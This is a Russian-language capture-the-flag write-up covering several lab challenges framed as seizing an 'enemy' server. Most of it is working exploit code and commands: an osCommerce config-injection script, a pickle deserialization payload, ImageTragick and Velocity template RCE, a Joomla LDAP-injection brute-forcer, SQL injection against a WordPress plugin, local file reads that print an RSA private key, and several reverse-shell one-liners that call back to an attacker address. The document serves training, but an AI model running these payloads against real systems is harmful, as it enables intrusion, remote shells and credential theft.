# kvvuctf_26.04


# PWN

## Захват инфраструктуры противника (ч.1) - 200 баллов

`http://100.64.X.186`

### Description

На данном сайте противником осуществляется закупка товаров для своих нужд. Однако информация о поставках хранится на сервере. Необходимо захватить сервер и прервать поставки, чтобы нарушить планы противника.

### Hint

Существуют ли эксплоиты для `osCommerce 2.3.4.1`?

### Writeup

1) Скачать [скрипт](https://www.exploit-db.com/exploits/44374) и в пэйлоаде заменить строку `ls` на `cat /flag.txt`

<details>
  <summary>Скрипт</summary>

    import requests

    # enter the the target url here, as well as the url to the install.php (Do NOT remove the ?step=4)
    base_url = "http://100.64.1.186/"  # Указать адрес своего сервера
    target_url = "http://100.64.1.186/install/install.php?step=4"  # Указать адрес своего сервера

    data = {
        'DIR_FS_DOCUMENT_ROOT': './'
    }

    # the payload will be injected into the configuration file via this code
    # '  define(\'DB_DATABASE\', \'' . trim($HTTP_POST_VARS['DB_DATABASE']) . '\');' . "\n" .
    # so the format for the exploit will be: '); PAYLOAD; /*

    payload = '\');'
    payload += 'system("cat /flag.txt");'    
    #payload += 'system("bash -i >& /dev/tcp/10.66.66.216/9999 0>&1");' # Reverse-shell не получается
    payload += '/*'

    data['DB_DATABASE'] = payload

    r = requests.post(url=target_url, data=data)
    print(r.status_code)
    if r.status_code == 200:
        print("[+] Successfully launched the exploit. Open the following URL to execute your code\n\n" + base_url + "install/includes/configure.php")
    else:
        print("[-] Exploit did not execute as planned")

</details>



## Захват инфраструктуры противника (ч.2) - 700 баллов

`http://100.64.X.183`

### Описание

На данном сайте развернута система управления проектами и совместной работы личного состава противника. Она предоставляет целый ряд функций для управления задачами, хранения и обмена документами, управления контактами и системой уведомлений. 
Необходимо получить удаленный доступ, чтобы выгрузить информацию о взаимодействии личного состава противника

### Hint

Порой `Metasploit` очень помогает с поиском и эксплуатацией уязвимостей.


### Writeup

1) Для получения **reverse-shell** используем **Metasploit**:

```
msfconsole
search phpCollab
use 0
set RHOSTS 100.64.x.183
set TARGET 0
set TARGETURI /
exploit
```

2) Эскалация:

```
cat /etc/crontab
- */5 * * * * root cd /var/www/html/ && rsync -t *.php 1.2.3.4:source/ - через эту шляпу эскалируемся
cd /var/www/html/ или cd ..
execute -f touch -a "-- '-e sh shell.php'"
execute -f echo -a "'#!/bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.66.66.216 9999 >/tmp/f' > shell.php"
```

3) На машине атакующего:

```
nc -nvlp 9999
cat /flag.txt
```


## Захват инфраструктуры противника (ч.3) - 1000 баллов

`http://100.64.X.188`

### Description

На данном сайте противником осуществляется закупка провизии для личного состава. Чтобы снизить боевой дух противника, необходимо захватить сервер и прервать поставки продовольствия.

### Hint

Разведка обнаружила, что на данном сервисе присутствует уязвимость `CVE-2016-3714`.

### Writeup


1) Для создания полезной нагрузки использовать этот [скрипт](https://github.com/Hood3dRob1n/CVE-2016-3714)

Полезная нагрузка для получения rce:
```
sh -i >& /dev/tcp/10.66.66.216/4444 0>&1 - гоним в Base64
```

Конвертируем её в Base64 и добавляем команду на декод, запись в файл и запуск этого файла:
```
echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuNjYuNjYuMjE2LzQ0NDQgMD4mMQ== | base64 -d > /tmp/test_shell.sh; bash /tmp/test_shell.sh
```

С помощью скаченного скрипта создаем `mvg` файл:
```
python2.7 imagick_builder.py
cmd
echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuNjYuNjYuMjE2LzQ0NDQgMD4mMQ== | base64 -d > /tmp/test_shell.sh; bash /tmp/test_shell.sh
```

На выходе получаем файл `mvg_rce.mvg`

2) На машине атакующего запускаем листенер - `nc -nvlp 4444`


3) Создаем аккаунт на сайте `http://100.64.1.188/Profile` и загружаем свой аватар - `mvg_rce.mvg` и получаем reverse-shell.

4) cat /flag.txt


##  Захват инфраструктуры противника (ч.4) - 1000 баллов.

`http://100.64.X.157`

### Description

На данном сайте развернута система управления контентом (CMS), которая позволяет создавать и управлять веб-сайтами противника. Также известно, что противник администрирует все свои сайты через данное приложение.
Необходимо получить удаленный доступ к CMS, чтобы выгрзить информацию о всех сайтах противника.

### Hint

Разведка отметила, что вход в систему администрирования выполняется через LDAP.

### Writeup

1) [Script from Github](https://github.com/allyshka/visualhack/blob/master/223/joomla-ldap/joomla-ldap-bruteforce.js)

<details>
  <summary>Script</summary>

    var charset = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    var postData = {}
    var tplUname = ";uid={0}";
    var tplPassword = ";|(uid=none)(password={0})";
    var currentLogin = "";
    var asterisk = "*";
    var err = "Unable to find user.";
    var suc = "Username and password do not match or you do not have an account yet.";
    // Step 1: brute username
    var username = "";
    var password = "";

    // First, checks if it isn't implemented yet.
    if (!String.prototype.format) {
    String.prototype.format = function() {
        var args = arguments;
        return this.replace(/{(\d+)}/g, function(match, number) { 
        return typeof args[number] != 'undefined'
            ? args[number]
            : match
        ;
        });
    };
    }

    function bruteLogin(uname, index) {
        index = typeof index !== 'undefined' ? index : 0;
        if (index >= charset.length) {
            jQuery('#mod-login-username').val(uname);
            // uname += charset[index]
            username = uname;
            password = brutePassword("");
            return uname;
        }
        jQuery('#form-login input').each(function(n, e) {
            cname = e.name;
            cval = e.value;
            if(e.type == 'password') e.type = 'text';
            postData[cname] = cval;
        });
        postData.username = tplUname.format(uname+charset[index]+asterisk);
        postData.passwd = 'any';
        jQuery('#mod-login-username').val(uname+charset[index]);
        jQuery.post('/administrator/index.php', postData, function(data) {
            if(data.search(suc) != -1) {
                uname += charset[index];
                bruteLogin(uname, 0)
            } else if(data.search(err) != -1 && index > charset.length) {
                return uname;
            } else if(data.search(err) != -1) {
                bruteLogin(uname, ++index);
            }
        });
    }

    function brutePassword(passwd, index) {
        index = typeof index !== 'undefined' ? index : 0;
        if (index >= charset.length) {
            jQuery('#mod-login-password').val(passwd);
            jQuery('#system-message-container').append('<div class="alert "><div class="alert-message">Username and password found. "'+username+':'+passwd+'</div><div>')
            // passwd += charset[index]
            return passwd;
        }
        jQuery('#form-login input').each(function(n, e) {
            cname = e.name;
            cval = e.value;
            if(e.type == 'password') e.type = 'text';
            postData[cname] = cval;
        });
        postData.username = tplPassword.format(passwd+charset[index]+asterisk);
        postData.passwd = 'any';
        jQuery('#mod-login-password').val(passwd+charset[index]);
        jQuery.post('/administrator/index.php', postData, function(data) {
            if(data.search(suc) != -1) {
                passwd += charset[index];
                brutePassword(passwd, 0)
            } else if(data.search(err) != -1 && index > charset.length) {
                return passwd;
            } else if(data.search(err) != -1) {
                brutePassword(passwd, ++index);
            }
        });
    }

    bruteLogin("");  
</details>



# WEB 

## Тестирование на проникновение  - 200 баллов

`http://100.64.X.142`


### Description

Данный сайт является доской почета военнослужащих, которые отличились в лучшую сторону по итогам прошедшего месяца.
Помимо ФИО и фотографии на ftp-сервере хранится другая информация о военнослужащих. Получится ли у Вас её достать?


### Hint

Попробуйте двойной url-encode.

### Writeup

1) Создаем файл-нагрузку `shell` на php:

```
<?php 
echo exec('cat /flag.txt'); 
?>
```

2) Через `Anonymous` грузим нагрузку на ftp сервер.

```
ftp
ftp> open 100.64.1.142
ftp> Anonymous
ftp> Anonymous
ftp> cd pub
ftp> put shell
```


3) Инклуд нагрузки через двойной url-encode:

```
/srv/ftp/pub/shell
```

```
/%25%32%66%25%37%33%25%37%32%25%37%36%25%32%66%25%36%36%25%37%34%25%37%30%25%32%66%25%37%30%25%37%35%25%36%32%25%32%66%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63
```


## Сервер управления - 1000 баллов

`http://100.64.X.189`

### Description

### Hint

### Writeup

1) Решать через BURP.



## Преобразование данных - 500 баллов

`IP:100.64.X.159:3000`

### Description

На данном сайте противник конвертирует полученные от разведки html-страницы в pdf-файлы для доклада командованию.
Необходимо получить доступ до сервера-конвертора.

### Hint

Разведка обнаружила, что файлы HTML конвертируются в PDF с помощью приложения Phantom на Node.JS.

### Writeup

1) Загрузить один их двух пэйлоадов.

**Первый пэйлоад:**

<details>
  <summary>payload1.html</summary>

    <script>
    x=new XMLHttpRequest;
    x.onload=function(){
    document.write(this.responseText)
    };
    x.open("GET","file:///home/kurlik/.ssh/id_rsa");
    x.send();
    </script>
</details>

<details>
  <summary>Вывод payload1.html</summary>

        -----BEGIN RSA PRIVATE KEY-----
    MIIEowIBAAKCAQEA0Uko+g430L/pfcKftPiUmd7BcWgjq5uO5Hf7IqT
    pnIAlxBGxW4Zx7LJKcf4EmQjgEynWaDTOt/kwk9hr5LAW/Fsd2/tlwg1
    jQSJjxtk2r+BqxHuw7TAEoTGjQBQ2Ob2nFlVWwMrHrSjKFNh/5gelb2
    JhzGf4T4hFokEpmVL9efMHbPet55gXWYCMPT9T8SfYYa2eWrRZZhN
    BDoU0PEEfp0pKqeKkZNQRRSz8nHWbzCyyOnV9JT3p8BF/nhqVVBA
    tcrLb1a0JgLlrzJ3K2hb6oMYE+nGwt8q9JuGQQIDAQABAoIBAGCOPF
    mulHdme3GdBUl4Bo+Hf30umc4DFYEOiHu2jrV9JaNAyKS2KS3bRlCd
    FfUnrsbnEM6MCithKwW/ogH4S3StFZv1xmBRI5XesZ0qlYxzbZDlJ2h
    xgdEP9kJkS9Nb6j/L0tYx2OWcqvy048wfMdYtum54ddekWiVcmih7jzv
    Q+ImLlkdzJoz5c6vBwIgw9k2ZmnacF8oE77Z3uzTPVbrlQASybi9bHN
    g3+t/NnFcFnDBHJCUctUVgeARTF/IIO968xEOD6hfOgAUBjqOC/LCcu
    Z1VoDUECgYEA6hzfGXoWUZPl++sPOVDok6ak02wrZ26LPyfShnYtW
    iXI/x/t0LgK5kYQ1I72Jbv8Hq+7T+6Z4F9YpHRBV9rUiPseR7SNL1Epd
    BXbF7f3A6QQ0jaJWR5wqNpcWw2eznmnJF0clRFy3Esh+znuY5EXIx0
    uJFtU0UXN8meBRQQwZyIlyWtsJbQvYniJxvD4yJmVCpUDZjFiZ4rTMd
    kSPlIFyLWNB2vxRKdXIIUIdubC/6/ydV/oQtkFkm8UbBR4ndRnoKBbvD
    4nAoNs5YkMkrrvYTYI1MZFdgok26UJ9uU8P+yMUCgYBI87I5uCeYSC
    LG+USlLEKlhN19TsfYroWGsavmU5UOA5QlbJtHuhksvMoowElR1sby
    gNPS8LI47Hy9X2cDpEoO3xWhQAugFxaBa1+GJ9qjQeI2eG22Zt1ooX
    twLP6KxLuBp7sVwVVgGYyQKBgGcdIV0HIaRIWCrJzEprfRVPi3fXAU
    Zcu8nzDDFbY+pJraSpZAqVeyNIPr0YoGC2ImcJ7m5uo3oUkDxV1LeG
    qacFlHdYMxQhuTLdIBDvRijNJsHjfUBW2re/B8bM7cLam2aAo+/+Ms
    ntglAoGBAMvsE9ehavU0ASDxGiAMXfkvFMVpfUpdmo8aHppUUodK
    yFnqD3R5qHd/jH9bzT3nqAGZsvt+4yJZ2FbKiwOX4QNGXDNFr8SBE
    UzVE8SdBbolVe4US5Kh5MYlSpfdRGMWc1FMpUMAQ+Uj7eACQyeq
    -----END RSA PRIVATE KEY-----

</details>

**Второй пэйлоад:**

<details>
  <summary>payload2.html</summary>

    <script>
    x=new XMLHttpRequest;
    x.onload=function(){
    document.write(this.responseText)
    };
    x.open("GET","file:////etc/passwd");
    x.send();
    </script>

</details>


<details>
  <summary>Вывод payload2.html</summary>

    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-
    data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List
    Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System
    (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nolo
    libuuid:x:100:101::/var/lib/libuuid:
    syslog:x:101:104::/home/syslog:/bin/false
    messagebus:x:102:106::/var/run/dbus:/bin/false
    landscape:x:103:109::/var/lib/landscape:/bin/false
    sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
    kurlik:x:1000:1000:kurlik,,,:/home/kurlik:/bin/bash

</details>

2) Подключение по ssh с учеткой kurlik: `ssh kurlik@100.64.1.159` и выполнение команды `cat /flag.txt`



## Поставщик противника - 700 баллов

`IP:100.64.X.143`


### Description

Разведка обнаружила сайт поставщика серверного оборудования для нужд противника.
Необходимо захватить сервер и прервать поставки, чтобы нарушить планы противника.

### Hint

Разведка докладывает, что на стороне сервера используется pickle.

### Writeup


1) На машине атакующего запустить `nc -nvlp 7777`

2) На машине атакующего через **python2.7** запустить [скрипт](http://v0ids3curity.blogspot.ru/2012/10/exploit-exercise-python-pickles.html):


<details>
  <summary>Script</summary>

    #!/usr/bin/env python
    #payload.py
    import pickle
    import socket
    import os
    import base64
    import requests
    class payload(object):
        def __reduce__(self):
            comm = "rm /tmp/shell; mknod /tmp/shell p; nc 10.66.66.216 7777 0</tmp/shell | /bin/sh 1>/tmp/shell"
            return (os.system, (comm,))
            
    cookie = base64.b64encode(pickle.dumps( payload()))
    resp = requests.get("http://100.64.1.143:8080/cart", cookies={"cartState":cookie})
    print(resp.text)

</details>

3) В окне с сессий nc выполнить команду: `python -c 'import pty; pty.spawn("/bin/bash")'` чтобы получить оболочку `Bash`

4) Получить reverse-shell от пользователя `user` и выполнить команду `cat /flag.txt`





## Нерадивый сотрудник - 500 баллов

`IP:100.64.X.187`

### Description

Один из сотрудников противника решил создать свой личный блог, однако сразу после создания забросил данную идею.
Разведке удалось найти данный блог. Необходимо получить удаленный доступ к серверу-хосту сайта.

### Hint

Наши специалисты обнаружили, что полученные данные можно сбрутить через словарь rockyou

### Writeup

1) Первый способ получения пароля (SQLi)

```
http://100.64.X.187/wp-content/plugins/kittycatfish-2.2/base.css.php?kc_ad=16+union+select+0x6b635f61645f637373,(select%20@@version)

http://100.64.X.187/wp-content/plugins/kittycatfish-2.2/base.css.php?kc_ad=16+union+select+0x6b635f61645f637373,(SELECT%20GROUP_CONCAT(table_name)%20FROM%20information_schema.tables%20WHERE%20table_schema=database())

http://100.64.X.187/wp-content/plugins/kittycatfish-2.2/base.css.php?kc_ad=16%20union%20select%200x6b635f61645f637373,(SELECT%20CONCAT(user_login,0x3d,user_pass)%20FROM%20wp_users%20LIMIT%200,1)
```

```
admin=$P$BsXjMDUySIPK363fK6EvyPLOHJhunU0
john ./hash.txt --wordlist rockyou.txt
```

2) Второй способ получения пароля

Перейти по адресу `http://100.64.x.187/wp-content/uploads/` и скачать файл `dbs.kdbx`

Выполнить:
```
keepass2john dbs.kdbx > hash2.txt
john ./hash2.txt
```

3) Перейти в админку WP и найти пользователя Shaggy Rogers. Подключиться по ssh с именем пользователя `shaggy` и паролем `scooby`. Выполнить `cat /flag.txt`



## Электронная цифровая подпись - 200 баллов

`IP:100.64.X.161`


### Description

Противник развернул свой сервер электронной цифровой подписи, для того, чтобы оптимизировать систему электронного документооборота.

### Hint

Попробуйте поменять свою подпись для электронной почты.

### Writeup

1) Простой способ решения без RCE.
После регистрации вставить в поле `Change your email signature` скрипт:
```
#set( $string = "cat /flag.txt" )
#set( $process = $string.class.forName("java.lang.Runtime").getRuntime().exec($string) )
#set( $characterClass = $string.class.forName("java.lang.Character") )
#set( $processResult = $process.waitFor() )
#set( $out = $process.getInputStream() )
#set( $result = "" )
#foreach( $i in [1..$out.available()] )
#set( $char = $string.valueOf($characterClass.toChars($out.read())) )
#set( $result = "$result$char" )
#end
$result
```

2) Получение RCE:

На атакуемой машине выполнить `nc -nvlp 9999`

После регистрации вставить в поле `Change your email signature` скрипт:
```
#set( $string = "nc 10.66.66.216 9999 -e /bin/bash" )
#set( $process = $string.class.forName("java.lang.Runtime").getRuntime().exec($string) )
#set( $characterClass = $string.class.forName("java.lang.Character") )
#set( $processResult = $process.waitFor() )
#set( $out = $process.getInputStream() )
#set( $result = "" )

#foreach( $i in [1..$out.available()] )
#set( $char = $string.valueOf($characterClass.toChars($out.read())) )
#set( $result = "$result$char" )
#end
$result
```
На атакуемой машине после инициализации сессии выполнить `cat /flag.txt`
